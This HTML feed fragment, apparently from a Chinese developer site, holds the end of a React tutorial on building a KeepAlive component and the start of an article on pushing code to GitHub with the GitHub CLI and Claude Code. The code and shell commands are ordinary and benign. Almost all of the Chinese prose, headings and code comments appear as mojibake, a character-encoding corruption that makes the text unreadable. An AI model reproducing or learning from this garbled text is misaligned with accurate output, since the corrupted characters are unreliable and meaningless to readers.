      &lt;h3 <span class="hljs-attr">style</span>={{ color: <span class="hljs-string">'#535bf2'</span> }}&gt;{name} è§†å›¾&lt;/h3&gt;
      &lt;p&gt;å½“å‰è®¡æ•°ï¼š{count} ğŸ¯&lt;/p&gt;
      &lt;button <span class="hljs-attr">onClick</span>={() =&gt; setCount(count + <span class="hljs-number">1</span>)} style={{ marginRight: <span class="hljs-string">'10px'</span> }}&gt;+<span class="hljs-number">1</span>&lt;/button&gt;
      &lt;button <span class="hljs-attr">onClick</span>={() =&gt; setCount(<span class="hljs-number">0</span>)}&gt;é‡ç½®&lt;/button&gt;
    &lt;/div&gt;
  )<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

const <span class="hljs-attr">App</span> = () =&gt; {
  // æ§åˆ¶å½“å‰æ¿€æ´»çš„ Tabï¼Œé»˜è®¤æ¿€æ´» A ç»„ä»¶
  const <span class="hljs-section">[activeTab, setActiveTab]</span> = useState('A')<span class="hljs-comment">;</span>

  return (
    &lt;div <span class="hljs-attr">style</span>={{ maxWidth: <span class="hljs-string">'800px'</span>, margin: <span class="hljs-string">'0 auto'</span>, padding: <span class="hljs-string">'2rem'</span> }}&gt;
      &lt;h1 <span class="hljs-attr">style</span>={{ textAlign: <span class="hljs-string">'center'</span>, marginBottom: <span class="hljs-string">'2rem'</span>, color: <span class="hljs-string">'#242424'</span> }}&gt;
        React KeepAlive ç»„ä»¶å®æˆ˜ ğŸš€
      &lt;/h1&gt;

      {/* Tab åˆ‡æ¢æŒ‰é’® */}
      &lt;div <span class="hljs-attr">style</span>={{ textAlign: <span class="hljs-string">'center'</span>, marginBottom: <span class="hljs-string">'2rem'</span> }}&gt;
        &lt;button
          <span class="hljs-attr">onClick</span>={() =&gt; setActiveTab(<span class="hljs-string">'A'</span>)}
          <span class="hljs-attr">style</span>={{
            marginRight: '1rem',
            padding: '0.8rem 1.5rem',
            backgroundColor: <span class="hljs-attr">activeTab</span> === <span class="hljs-string">'A'</span> ? <span class="hljs-string">'#646cff'</span> : <span class="hljs-string">'#f9f9f9'</span>,
            color: <span class="hljs-attr">activeTab</span> === <span class="hljs-string">'A'</span> ? <span class="hljs-string">'white'</span> : <span class="hljs-string">'#242424'</span>
          }}
        &gt;
          æ˜¾ç¤º A ç»„ä»¶
        &lt;/button&gt;
        &lt;button
          <span class="hljs-attr">onClick</span>={() =&gt; setActiveTab(<span class="hljs-string">'B'</span>)}
          <span class="hljs-attr">style</span>={{
            padding: '0.8rem 1.5rem',
            backgroundColor: <span class="hljs-attr">activeTab</span> === <span class="hljs-string">'B'</span> ? <span class="hljs-string">'#535bf2'</span> : <span class="hljs-string">'#f9f9f9'</span>,
            color: <span class="hljs-attr">activeTab</span> === <span class="hljs-string">'B'</span> ? <span class="hljs-string">'white'</span> : <span class="hljs-string">'#242424'</span>
          }}
        &gt;
          æ˜¾ç¤º B ç»„ä»¶
        &lt;/button&gt;
      &lt;/div&gt;

      {/* ç”¨ KeepAlive åŒ…è£¹éœ€è¦ç¼“å­˜çš„ç»„ä»¶ */}
      &lt;KeepAlive <span class="hljs-attr">activeId</span>={activeTab}&gt;
        {<span class="hljs-attr">activeTab</span> === <span class="hljs-string">'A'</span> ? &lt;Counter name=<span class="hljs-string">"A"</span> /&gt; : &lt;OtherCounter name=<span class="hljs-string">"B"</span> /&gt;}
      &lt;/KeepAlive&gt;

      &lt;div <span class="hljs-attr">style</span>={{ marginTop: <span class="hljs-string">'2rem'</span>, textAlign: <span class="hljs-string">'center'</span>, color: <span class="hljs-string">'#888'</span> }}&gt;
        ğŸ‘‰ åˆ‡æ¢ Tab è¯•è¯•ï¼Œç»„ä»¶çŠ¶æ€ä¸ä¼šä¸¢å¤±å“¦ï¼
      &lt;/div&gt;
    &lt;/div&gt;
  )<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

export default App<span class="hljs-comment">;</span>
</code></pre>
<h4 data-id="heading-17">3. æ•ˆæœå±•ç¤º</h4>
<h5 data-id="heading-18">ï¼ˆ1ï¼‰åŠŸèƒ½æ•ˆæœ</h5>
<ul>
<li>é¦–æ¬¡è¿›å…¥é¡µé¢ï¼šæ˜¾ç¤º A ç»„ä»¶ï¼Œè®¡æ•°ä¸º 0ï¼›</li>
<li>ç‚¹å‡» A ç»„ä»¶ â€œ+1â€ æŒ‰é’®ï¼Œè®¡æ•°å˜ä¸º 7ï¼›</li>
<li>åˆ‡æ¢åˆ° B ç»„ä»¶ï¼šB ç»„ä»¶è®¡æ•°ä¸º 0ï¼ŒA ç»„ä»¶éšè—ï¼ˆæœªå¸è½½ï¼‰ï¼›</li>
<li>ç‚¹å‡» B ç»„ä»¶ â€œ+1â€ æŒ‰é’®ï¼Œè®¡æ•°å˜ä¸º 5ï¼›</li>
<li>åˆ‡æ¢å› A ç»„ä»¶ï¼šA ç»„ä»¶è®¡æ•°ä¾ç„¶æ˜¯ 7ï¼Œæ— éœ€é‡æ–°åˆå§‹åŒ–ï¼›</li>
<li>æ§åˆ¶å°æ—¥å¿—ï¼šåªæœ‰ç»„ä»¶æŒ‚è½½æ—¥å¿—ï¼Œæ— å¸è½½æ—¥å¿—ï¼Œè¯æ˜ç»„ä»¶å§‹ç»ˆå­˜åœ¨ã€‚</li>
</ul>
<h5 data-id="heading-19">ï¼ˆ2ï¼‰ç”¨æˆ·ä½“éªŒ</h5>
<ul>
<li>åˆ‡æ¢æ— å»¶è¿Ÿï¼ŒçŠ¶æ€æ— ç¼è¡”æ¥ï¼›</li>
<li>é¿å…é‡å¤æ‰§è¡Œ <code>useEffect</code> ä¸­çš„é€»è¾‘ï¼ˆå¦‚æ¥å£è¯·æ±‚ï¼‰ï¼Œæå‡æ€§èƒ½ï¼›</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/02ac2def766c4d428fa6efc0df4e1d97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb3h1ZV8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770370996&amp;x-signature=nniOvf5UJsZhDge9KccOFxi6y%2Bw%3D" alt="QQ20260130-172541.gif" loading="lazy"/></p>
<h3 data-id="heading-20">äº”ã€æ ¸å¿ƒçŸ¥è¯†ç‚¹æ¢³ç† ğŸ“š</h3>
<p>é€šè¿‡æ‰‹å†™ <code>KeepAlive</code> ç»„ä»¶ï¼Œæˆ‘ä»¬æŒæ¡äº†è¿™äº›å…³é”®çŸ¥è¯†ç‚¹ï¼š</p>
<ol>
<li><strong>React Hooks å®æˆ˜</strong>ï¼š<code>useState</code> ç®¡ç†ç¼“å­˜çŠ¶æ€ï¼Œ<code>useEffect</code> ç›‘å¬ä¾èµ–æ›´æ–°ï¼Œå‡½æ•°å¼æ›´æ–°é¿å…çŠ¶æ€è¦†ç›–ï¼›</li>
<li><strong>ç»„ä»¶ç”Ÿå‘½å‘¨æœŸæ§åˆ¶</strong>ï¼šé€šè¿‡ <code>display</code> æ ·å¼æ§åˆ¶ç»„ä»¶æ˜¾éšï¼Œæ›¿ä»£æŒ‚è½½ / å¸è½½ï¼Œä»è€Œä¿ç•™çŠ¶æ€ï¼›</li>
<li><strong>æ•°æ®ç»“æ„åº”ç”¨</strong>ï¼šå¯¹è±¡ä½œä¸ºç¼“å­˜å®¹å™¨ï¼Œ<code>Object.entries</code> å®ç°å¯¹è±¡éå†ï¼›</li>
<li><strong>Props ä¼ é€’ä¸å¤ç”¨</strong>ï¼š<code>children</code> props è®© <code>KeepAlive</code> ç»„ä»¶é€šç”¨åŒ–ï¼Œæ”¯æŒä»»æ„å­ç»„ä»¶ç¼“å­˜ï¼›</li>
<li><strong>çŠ¶æ€ç®¡ç†æ€è·¯</strong>ï¼šä»¥å”¯ä¸€æ ‡è¯†ï¼ˆ<code>activeId</code>ï¼‰å…³è”ç»„ä»¶ï¼Œç¡®ä¿ç¼“å­˜çš„å‡†ç¡®æ€§å’Œå”¯ä¸€æ€§ï¼›</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–æŠ€å·§</strong>ï¼šé¿å…ç»„ä»¶é¢‘ç¹æŒ‚è½½ / å¸è½½ï¼Œå‡å°‘ DOM æ“ä½œå’Œèµ„æºæ¶ˆè€—ï¼›</li>
<li><strong>ç»„ä»¶è®¾è®¡åŸåˆ™</strong>ï¼šé€šç”¨ã€ä½ä¾µå…¥ã€æ˜“æ‰©å±•ï¼Œä¸ä¿®æ”¹å­ç»„ä»¶é€»è¾‘å³å¯å®ç°ç¼“å­˜åŠŸèƒ½ã€‚</li>
</ol>
<p>è¡¥å……ï¼š Map ä¸ JSON çš„åŒºåˆ« â€”â€”Map å¯ä»¥ç›´æ¥å­˜å‚¨å¯¹è±¡ä½œä¸º keyï¼Œè€Œ JSON åªèƒ½å­˜å‚¨å­—ç¬¦ä¸²ã€‚å¦‚æœéœ€è¦ç¼“å­˜ä»¥å¯¹è±¡ä¸ºæ ‡è¯†çš„ç»„ä»¶ï¼Œå¯å°† <code>cache</code> æ”¹ä¸º Map ç±»å‹ï¼Œä¼˜åŒ–å¦‚ä¸‹ï¼š</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç”¨ Map æ›¿ä»£å¯¹è±¡ä½œä¸ºç¼“å­˜å®¹å™¨</span>
<span class="hljs-keyword">const</span> [cache, setCache] = <span class="hljs-title function_">useState</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>());

<span class="hljs-comment">// æ›´æ–°ç¼“å­˜</span>
<span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">if</span> (!cache.<span class="hljs-title function_">has</span>(activeId)) {
    <span class="hljs-title function_">setCache</span>(<span class="hljs-function">(<span class="hljs-params">prev</span>) =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>(prev).<span class="hljs-title function_">set</span>(activeId, children));
  }
}, [activeId, children, cache]);

<span class="hljs-comment">// éå†ç¼“å­˜</span>
<span class="hljs-keyword">return</span> (
  <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
    {Array.from(cache.entries()).map(([id, component]) =&gt; (
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{id}</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">display:</span> <span class="hljs-attr">id</span> === <span class="hljs-string">activeId</span> ? '<span class="hljs-attr">block</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">none</span>' }}&gt;</span>
        {component}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    ))}
  <span class="hljs-tag">&lt;/&gt;</span></span>
);
</code></pre>
<h3 data-id="heading-21">å…­ã€ç»“è¯­ ğŸ‰</h3>
<p>æ‰‹å†™ <code>Keep-Alive</code> ç»„ä»¶çœ‹ä¼¼ç®€å•ï¼Œå´æ¶µç›–äº† React ç»„ä»¶è®¾è®¡ã€çŠ¶æ€ç®¡ç†ã€æ€§èƒ½ä¼˜åŒ–ç­‰å¤šä¸ªæ ¸å¿ƒçŸ¥è¯†ç‚¹ã€‚å®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ â€œç¼“å­˜ + æ˜¾éšæ§åˆ¶â€ï¼Œé€šè¿‡å·§å¦™çš„çŠ¶æ€ç®¡ç†é¿å…ç»„ä»¶å¸è½½ï¼Œä»è€Œä¿ç•™çŠ¶æ€ã€‚</p>
<p>åœ¨å®é™…å¼€å‘ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åŸºäºè¿™ä¸ªåŸºç¡€ç‰ˆæœ¬æ‰©å±•æ›´å¤šåŠŸèƒ½ï¼šæ¯”å¦‚è®¾ç½®ç¼“å­˜ä¸Šé™ï¼ˆé¿å…å†…å­˜æº¢å‡ºï¼‰ã€æ‰‹åŠ¨æ¸…é™¤ç¼“å­˜ã€æ”¯æŒè·¯ç”±çº§ç¼“å­˜ç­‰ã€‚æŒæ¡äº†è¿™ä¸ªç»„ä»¶çš„å®ç°é€»è¾‘ï¼Œä½ ä¸ä»…èƒ½è§£å†³å®é™…å¼€å‘ä¸­çš„çŠ¶æ€ä¿ç•™é—®é¢˜ï¼Œè¿˜èƒ½æ›´æ·±å…¥ç†è§£ React ç»„ä»¶çš„æ¸²æŸ“æœºåˆ¶å’Œç”Ÿå‘½å‘¨æœŸã€‚</p>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸¦ä½ åƒé€ <code>Keep-Alive</code> ç»„ä»¶çš„æ ¸å¿ƒåŸç†ï¼Œä¸‹æ¬¡é‡åˆ°ç±»ä¼¼éœ€æ±‚æ—¶ï¼Œä¹Ÿèƒ½ä»å®¹æ‰‹å†™å®ç°ï¼å¦‚æœè§‰å¾—æœ‰æ”¶è·ï¼Œæ¬¢è¿ç‚¹èµæ”¶è—ï¼Œä¸€èµ·æ¢ç´¢ React çš„æ›´å¤šå®æˆ˜æŠ€å·§å§ï½ ğŸš€</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[AI æ—¶ä»£æ“ä½œ GitHub çš„ä¸‰ç§æ–¹å¼ï¼Œç”¨è¿‡çš„éƒ½è¯´é¦™]]></title>    <link>https://juejin.cn/post/7600678255042707465</link>    <guid>https://juejin.cn/post/7600678255042707465</guid>    <pubDate>2026-01-30T07:28:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600678255042707465" data-draft-id="7600990891206115355" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="AI æ—¶ä»£æ“ä½œ GitHub çš„ä¸‰ç§æ–¹å¼ï¼Œç”¨è¿‡çš„éƒ½è¯´é¦™"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2026-01-30T07:28:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="aZheçš„å…¨æ ˆçŸ¥è¯†åˆ†äº«"/> <meta itemprop="url" content="https://juejin.cn/user/1039471959105228"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            AI æ—¶ä»£æ“ä½œ GitHub çš„ä¸‰ç§æ–¹å¼ï¼Œç”¨è¿‡çš„éƒ½è¯´é¦™
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1039471959105228/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    aZheçš„å…¨æ ˆçŸ¥è¯†åˆ†äº«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T07:28:22.000Z" title="Fri Jan 30 2026 07:28:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    20
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä¸€å¥è¯æ¨é€ä»£ç åˆ° GitHubï¼Œä¸€æ¬¡é…ç½®æ°¸ä¹…ä½¿ç”¨ã€‚</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">æ ¸å¿ƒä»·å€¼</h2>
<p><strong>ä¼ ç»Ÿæ–¹å¼</strong>ï¼šæ‰“å¼€æµè§ˆå™¨ â†’ ç™»å½• GitHub â†’ åˆ›å»ºä»“åº“ â†’ å¤åˆ¶åœ°å€ â†’ git remote add â†’ git push</p>
<p><strong>ç°åœ¨åªéœ€è¦</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">ä½ ï¼šå¸®æˆ‘æŠŠè¿™ä¸ªé¡¹ç›®æ¨é€åˆ° GitHub
AIï¼šå¥½çš„ï¼Œå·²å®Œæˆã€‚ä»“åº“åœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/xxx/xxx</span>
</code></pre>
<p><strong>è€Œä¸”</strong>ï¼šç¬¬ä¸€æ¬¡é…ç½®åï¼Œä»¥åæ‰€æœ‰é¡¹ç›®éƒ½ä¸éœ€è¦å†è®¤è¯ï¼Œç›´æ¥æ¨é€ã€‚</p>
<hr/>
<h2 data-id="heading-1">å¿«é€Ÿå¼€å§‹ï¼ˆ3 åˆ†é’Ÿä¸Šæ‰‹ï¼‰</h2>
<h3 data-id="heading-2">ç¬¬ä¸€æ­¥ï¼šå®‰è£…å·¥å…·</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®‰è£… GitHub CLI</span>
brew install gh

<span class="hljs-comment"># å®‰è£… Claude Code</span>
npm install -g @anthropic-ai/claude-code
</code></pre>
<h3 data-id="heading-3">ç¬¬äºŒæ­¥ï¼šç™»å½• GitHubï¼ˆä»…éœ€ä¸€æ¬¡ï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash">gh auth login
</code></pre>
<p>æŒ‰æç¤ºåœ¨æµè§ˆå™¨å®Œæˆè®¤è¯ã€‚<strong>è¿™æ˜¯å”¯ä¸€éœ€è¦æ‰‹åŠ¨æ“ä½œçš„æ­¥éª¤ï¼Œè€Œä¸”åªéœ€è¦åšä¸€æ¬¡ã€‚</strong></p>
<h3 data-id="heading-4">ç¬¬ä¸‰æ­¥ï¼šå¼€å§‹ä½¿ç”¨</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> your-project    <span class="hljs-comment"># è¿›å…¥ä»»æ„é¡¹ç›®</span>
claude             <span class="hljs-comment"># å¯åŠ¨ AI åŠ©æ‰‹</span>
</code></pre>
<p>ç„¶åç›´æ¥è¯´ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"å¸®æˆ‘æŠŠè¿™ä¸ªé¡¹ç›®æ¨é€åˆ° GitHub"</span>
</code></pre>
<p>å®Œæˆã€‚ä»¥åä»»ä½•é¡¹ç›®ï¼Œé‡å¤ç¬¬ä¸‰æ­¥å³å¯ã€‚</p>
<hr/>
<h2 data-id="heading-5">ä¸€æ¬¡é…ç½®ï¼Œæ°¸ä¹…ä½¿ç”¨</h2>
<p>è¿™æ˜¯æœ¬æ–¹æ¡ˆæœ€å¤§çš„ä¼˜åŠ¿ï¼Œå€¼å¾—å•ç‹¬å¼ºè°ƒï¼š</p>





























<table><thead><tr><th>åœºæ™¯</th><th>æ“ä½œ</th></tr></thead><tbody><tr><td>ç¬¬ä¸€ä¸ªé¡¹ç›®</td><td>å®‰è£… gh CLI â†’ è®¤è¯ â†’ æ¨é€</td></tr><tr><td>ç¬¬äºŒä¸ªé¡¹ç›®</td><td>ç›´æ¥è¯´"å¸®æˆ‘æ¨é€åˆ° GitHub"</td></tr><tr><td>ç¬¬ä¸‰ä¸ªé¡¹ç›®</td><td>ç›´æ¥è¯´"å¸®æˆ‘æ¨é€åˆ° GitHub"</td></tr><tr><td>ç¬¬ N ä¸ªé¡¹ç›®</td><td>ç›´æ¥è¯´"å¸®æˆ‘æ¨é€åˆ° GitHub"</td></tr><tr><td>é‡å¯ç”µè„‘å</td><td>ç›´æ¥è¯´"å¸®æˆ‘æ¨é€åˆ° GitHub"</td></tr></tbody></table>
<p><strong>åŸç†</strong>ï¼šgh CLI çš„è®¤è¯ä¿¡æ¯å­˜å‚¨åœ¨ç³»ç»Ÿé’¥åŒ™ä¸²ä¸­ï¼Œå…¨å±€ç”Ÿæ•ˆï¼Œæ°¸ä¹…æœ‰æ•ˆã€‚</p>
<hr/>
<h2 data-id="heading-6">ä¸‰ç§æ–¹å¼å¯¹æ¯”</h2>
<p>æœ¬æ–‡ä»‹ç»ä¸‰ç§æ“ä½œ GitHub çš„æ–¹å¼ï¼Œ<strong>æ¨èç¬¬äºŒç§</strong>ï¼š</p>





























<table><thead><tr><th>æ–¹å¼</th><th>æ“ä½œæ–¹å¼</th><th>å­¦ä¹ æˆæœ¬</th><th>æ¨èåº¦</th></tr></thead><tbody><tr><td>GitHub CLI</td><td>æ‰‹åŠ¨æ•²å‘½ä»¤</td><td>éœ€è¦è®°å‘½ä»¤</td><td>ä¸€èˆ¬</td></tr><tr><td><strong>Claude Code + gh CLI</strong></td><td><strong>è¯´äººè¯</strong></td><td><strong>é›¶æˆæœ¬</strong></td><td><strong>å¼ºçƒˆæ¨è</strong></td></tr><tr><td>Claude Code + MCP</td><td>è¯´äººè¯</td><td>é…ç½®ç¨å¤æ‚</td><td>æ¨è</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-7">æ–¹å¼ä¸€ï¼šGitHub CLIï¼ˆåŸºç¡€ï¼‰</h2>
<p>GitHub CLI (gh) æ˜¯ GitHub å®˜æ–¹å‘½ä»¤è¡Œå·¥å…·ã€‚</p>
<h3 data-id="heading-8">å®‰è£…ä¸è®¤è¯</h3>
<pre><code class="hljs language-bash" lang="bash">brew install gh      <span class="hljs-comment"># å®‰è£…</span>
gh auth login        <span class="hljs-comment"># ç™»å½•ï¼ˆæŒ‰æç¤ºæ“ä½œï¼‰</span>
</code></pre>
<h3 data-id="heading-9">æ ¸å¿ƒå‘½ä»¤</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºä»“åº“å¹¶æ¨é€ï¼ˆæœ€å¸¸ç”¨ï¼‰</span>
gh repo create ä»“åº“å --public --<span class="hljs-built_in">source</span>=. --remote=github --push

<span class="hljs-comment"># å…¶ä»–å¸¸ç”¨å‘½ä»¤</span>
gh repo <span class="hljs-built_in">clone</span> owner/repo    <span class="hljs-comment"># å…‹éš†ä»“åº“</span>
gh <span class="hljs-built_in">pr</span> create                <span class="hljs-comment"># åˆ›å»º PR</span>
gh issue list               <span class="hljs-comment"># æŸ¥çœ‹ Issue</span>
</code></pre>
<h3 data-id="heading-10">å°ç»“</h3>
<ul>
<li><strong>ä¼˜ç‚¹</strong>ï¼šå®˜æ–¹å·¥å…·ï¼ŒåŠŸèƒ½å®Œæ•´</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šéœ€è¦è®°ä½å‘½ä»¤å’Œå‚æ•°</li>
</ul>
<hr/>
<h2 data-id="heading-11">æ–¹å¼äºŒï¼šClaude Code + gh CLIï¼ˆæ¨èï¼‰</h2>
<p>ä¸æƒ³è®°å‘½ä»¤ï¼Ÿè®© AI å¸®ä½ æ‰§è¡Œã€‚</p>
<h3 data-id="heading-12">ä»€ä¹ˆæ˜¯ Claude Code</h3>
<p>Anthropic å®˜æ–¹å‘½ä»¤è¡Œ AI åŠ©æ‰‹ï¼š</p>
<ul>
<li>ç›´æ¥åœ¨ç»ˆç«¯ä¸ AI å¯¹è¯</li>
<li>AI å¯ä»¥æ‰§è¡Œå‘½ä»¤ã€è¯»å†™æ–‡ä»¶ã€æ“ä½œ Git</li>
<li>ç†è§£é¡¹ç›®ä¸Šä¸‹æ–‡</li>
</ul>
<h3 data-id="heading-13">å®‰è£…</h3>
<pre><code class="hljs language-bash" lang="bash">npm install -g @anthropic-ai/claude-code
</code></pre>
<h3 data-id="heading-14">å¦‚ä½•ä¸ Claude äº¤æµ</h3>
<p><strong>ç›´æ¥è¯´ç›®æ ‡ï¼ˆæ¨èï¼‰</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"å¸®æˆ‘æŠŠè¿™ä¸ªé¡¹ç›®æ¨é€åˆ° GitHub"</span>
</code></pre>
<p>Claude ä¼šè‡ªåŠ¨ï¼šæ£€æŸ¥ gh CLI â†’ æ£€æŸ¥è®¤è¯ â†’ åˆ›å»ºä»“åº“ â†’ æ¨é€ä»£ç </p>
<p><strong>æŒ‡å®šå·¥å…·</strong>ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-string">"ç”¨ gh cli åˆ›å»ºä¸€ä¸ª GitHub ä»“åº“å¹¶æ¨é€"</span>
</code></pre>
